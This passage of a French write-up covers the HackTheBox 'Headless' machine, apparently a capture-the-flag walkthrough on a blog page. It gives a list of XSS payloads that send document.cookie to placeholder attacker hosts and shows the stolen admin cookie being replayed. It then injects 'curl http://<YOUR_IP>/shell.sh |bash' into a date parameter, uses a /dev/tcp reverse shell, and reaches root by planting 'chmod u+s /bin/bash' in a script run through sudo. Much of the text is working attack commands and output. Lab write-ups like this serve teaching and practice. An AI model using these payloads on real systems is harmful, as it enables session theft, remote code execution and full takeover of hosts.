+&lt;script&gt;window.location<span class="o">=</span><span class="s2">"https://&lt;SERVER_IP&gt;/?c="</span>.concat<span class="o">(</span>document.cookie<span class="o">)</span>&lt;/script&gt;
+&lt;script&gt;var <span class="nv">xhttp</span><span class="o">=</span>new XMLHttpRequest<span class="o">()</span><span class="p">;</span>xhttp.open<span class="o">(</span><span class="s2">"GET"</span>, <span class="s2">"http://&lt;SERVER_IP&gt;/?c="</span>%2Bdocument.cookie, <span class="nb">true</span><span class="o">)</span><span class="p">;</span>xhttp.send<span class="o">()</span><span class="p">;</span>&lt;/script&gt;
+&lt;script&gt;eval<span class="o">(</span>atob<span class="o">(</span><span class="s1">'ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'</span><span class="o">))</span><span class="p">;</span>&lt;/script&gt;
+&lt;script&gt;fetch<span class="o">(</span><span class="s1">'https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net'</span>, <span class="o">{</span>method: <span class="s1">'POST'</span>, mode: <span class="s1">'no-cors'</span>, body:document.cookie<span class="o">})</span><span class="p">;</span>&lt;/script&gt;
+&lt;script&gt;navigator.sendBeacon<span class="o">(</span><span class="s1">'https://ssrftest.com/x/AAAAA'</span>,document.cookie<span class="o">)</span>&lt;/script&gt;
+</code></pre></div></div>
+<p>Nous allons choisissait la commande suivante</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;img <span class="nv">src</span><span class="o">=</span>x <span class="nv">onerror</span><span class="o">=</span>this.src<span class="o">=</span><span class="s2">"http://&lt;YOUR_SERVER_IP&gt;/?c="</span>+document.cookie&gt;
+</code></pre></div></div>
+<p>Nous allons changer notre user-agent pour un user-agent de google afin que le serveur puisse accepter notre requête, on crée un nouvel agent avec qui se nomme xss avec comme string la commande xss 
+<img src="../assets/uploads/2024/2024-htb-headless/d.png" alt="User-agent" /></p>
+
+<p>Avant de lancer l’attaque, il faut créer un serveur pour récupérer les cookies.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>Une fois que l’attaque est lancée, on peut voir que le serveur a reçu les cookies.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Mar 26, 2024 - 14:08:42 <span class="o">(</span>CET<span class="o">)]</span> exegol-htb /workspace: python3 <span class="nt">-m</span> http.server 9999
+Serving HTTP on 0.0.0.0 port 9999 <span class="o">(</span>http://0.0.0.0:9999/<span class="o">)</span> ...
+10.10.11.8 - - 26/Mar/2024 14:15:48] <span class="s2">"GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+<p>Nous avons recu le cookie is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</p>
+
+<p>On peut voir que l’on ne peut pas se connecter au /dashboard 
+<img src="../assets/uploads/2024/2024-htb-headless/e.png" alt="cookie" /></p>
+
+<p>Du coup nous allons essayer de connecter au /dashboard. Pour ça nous allons utiliser le cookie que nous avons reçu.</p>
+
+<p>on va mettre le cookie dans une extension de navigateur avec <a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search">Cookie-Editor</a></p>
+
+<p><img src="..site/assets/uploads/2024/2024-htb-headless/f.png" alt="upload_cookie" /></p>
+
+<p><img src="../assets/uploads/2024/2024-htb-headless/g.png" alt="upload_cookie" /></p>
+
+<p>Une fois tout bien préparé, on peut se connecter au /dashboard</p>
+
+<p><img src="../assets/uploads/2024/2024-htb-headless/h.png" alt="dashboard" /></p>
+
+<p>Nous allons voir les requêtes http des dates que l’ont envoie au serveur via burpsuite</p>
+
+<p><img src="../assets/uploads/2024/2024-htb-headless/i.png" alt="burp" /></p>
+
+<p>On peut voir que le serveur envoie une requête POST avec un paramètre date. On ajoute un reverse shell dans le paramètre date</p>
+
+<p>Créer un reverse shell dans un fichier shell.sh</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-c</span>  <span class="s2">"sh -i &gt;&amp; /dev/tcp/10.10.14.62/9001 0&gt;&amp;1"</span>
+</code></pre></div></div>
+
+<p>Commande pour envoyer le reverse shell à notre machine</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">date</span><span class="o">=</span>2023-09-15<span class="p">;</span>curl http://&lt;YOUR_IP&gt;/shell.sh |bash
+</code></pre></div></div>
+
+<h2 id="user">User</h2>
+
+<p>On peut voir que le serveur a reçu notre reverse shell</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Mar 26, 2024 - 15:07:15 <span class="o">(</span>CET<span class="o">)]</span> exegol-htb Headless <span class="c"># pwncat-cs -lp 9001</span>
+<span class="o">[</span>15:07:21] Welcome to pwncat 🐈!                                                                                                                               __main__.py:164
+<span class="o">[</span>15:07:25] received connection from 10.10.11.8:42146                                                                                                                bind.py:84
+<span class="o">[</span>15:07:26] 0.0.0.0:9001: upgrading from /usr/bin/dash to /usr/bin/bash                                                                                          manager.py:957
+<span class="o">[</span>15:07:27] 10.10.11.8:42146: registered new host w/ db                                                                                                          manager.py:957
+<span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat:
+<span class="o">(</span>remote<span class="o">)</span> dvir@headless:/home/dvir/app:
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>remote<span class="o">)</span> root@headless:/root# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dvir<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dvir<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>dvir<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>dvir<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
+<span class="o">(</span>remote<span class="o">)</span> root@headless:/home/dvir# <span class="nb">cat </span>user.txt
+0e<span class="k">*************</span>ba
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>remote<span class="o">)</span> dvir@headless:/home/dvir<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>dvir on headless:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, use_pty
+
+User dvir may run the following commands on headless:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/syscheck
+</code></pre></div></div>
+
+<p>On va regarder le fichier syscheck</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>remote<span class="o">)</span> dvir@headless:/home/dvir<span class="nv">$ </span><span class="nb">cat</span> /usr/bin/syscheck
+<span class="c">#!/bin/bash</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-ne</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
+  </span><span class="nb">exit </span>1
+<span class="k">fi
+
+</span><span class="nv">last_modified_time</span><span class="o">=</span><span class="si">$(</span>/usr/bin/find /boot <span class="nt">-name</span> <span class="s1">'vmlinuz*'</span> <span class="nt">-exec</span> <span class="nb">stat</span> <span class="nt">-c</span> %Y <span class="o">{}</span> + | /usr/bin/sort <span class="nt">-n</span> | /usr/bin/tail <span class="nt">-n</span> 1<span class="si">)</span>
+<span class="nv">formatted_time</span><span class="o">=</span><span class="si">$(</span>/usr/bin/date <span class="nt">-d</span> <span class="s2">"@</span><span class="nv">$last_modified_time</span><span class="s2">"</span> +<span class="s2">"%d/%m/%Y %H:%M"</span><span class="si">)</span>
+/usr/bin/echo <span class="s2">"Last Kernel Modification Time: </span><span class="nv">$formatted_time</span><span class="s2">"</span>
+
+<span class="nv">disk_space</span><span class="o">=</span><span class="si">$(</span>/usr/bin/df <span class="nt">-h</span> / | /usr/bin/awk <span class="s1">'NR==2 {print $4}'</span><span class="si">)</span>
+/usr/bin/echo <span class="s2">"Available disk space: </span><span class="nv">$disk_space</span><span class="s2">"</span>
+
+<span class="nv">load_average</span><span class="o">=</span><span class="si">$(</span>/usr/bin/uptime | /usr/bin/awk <span class="nt">-F</span><span class="s1">'load average:'</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
+/usr/bin/echo <span class="s2">"System load average: </span><span class="nv">$load_average</span><span class="s2">"</span>
+
+<span class="k">if</span> <span class="o">!</span> /usr/bin/pgrep <span class="nt">-x</span> <span class="s2">"initdb.sh"</span> &amp;&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
+  /usr/bin/echo <span class="s2">"Database service is not running. Starting it..."</span>
+  ./initdb.sh 2&gt;/dev/null
+<span class="k">else</span>
+  /usr/bin/echo <span class="s2">"Database service is running."</span>
+<span class="k">fi
+
+</span><span class="nb">exit </span>0
+</code></pre></div></div>
+
+<p>Nous pouvons voir que initdb.sh est lancé, il nous suffit donc de le créer et d’y placer une charge utile malveillante comme suit :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"chmod u+s /bin/bash"</span> <span class="o">&gt;</span> initdb.sh
+<span class="nb">chmod</span> +x initdb.sh
+</code></pre></div></div>
+
+<p>Exécuter ensuite /usr/bin/syscheck avec les privilèges sudo dans le même dossier que initdb.sh puis /bin/bash -p pour accéder à l’interpréteur de commandes racine</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/syscheck
+/bin/bash <span class="nt">-p</span>
+</code></pre></div></div>
+<h2 id="root">root</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>remote<span class="o">)</span> root@headless:/root# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dvir<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dvir<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>dvir<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
+<span class="o">(</span>remote<span class="o">)</span> root@headless:/root# <span class="nb">cat </span>root.txt
+80<span class="k">*************</span>ce
+</code></pre></div></div>
+
+<h2 id="source">Source</h2>
+
+<p><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#retrieve-cookies">https://book.hacktricks.xyz/</a></p>
+
+  </article>
+</div>
+<div class="keywords">
+    <span class="post-tags"><a href="/archives/#hackthebox"><i class="fas fa-tags"></i> HackTheBox</a><a href="/archives/#web"><i class="fas fa-tags"></i> Web</a><a href="/archives/#xss"><i class="fas fa-tags"></i> XSS</a></span>
+  </div>
+
+
+
+<div class="related">
+  <h2>Articles similaires</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/probe-attack/">
+            Probe Attack
+            <small>20 Aug 2024</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/m5stack-cardputer/">
+            M5stack Cardputer
+            <small>20 Aug 2024</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/rubber-ducky-attiny85/">
+            Rubber Ducky (ATtiny85)
+            <small>01 Apr 2024</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+    var disqus_config = function () {
+        this.page.url = 'http://localhost:4000/headless/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = '0000-0000-0000-0000';
+    };
+    
+    (function() {  // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        
+        s.src = '//hackndo.disqus.com/embed.js';
+        
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+        </div>
+    </main>
+    <script src="/assets/js/jquery-2.1.4.js"></script>
+    <script src="/assets/js/jquery.menu-aim.js"></script>
+    <script src="/assets/js/anchor.min.js"></script>
+    <script src="/assets/js/main.js"></script> <!-- Resource jQuery -->
+  </body>
+</html>
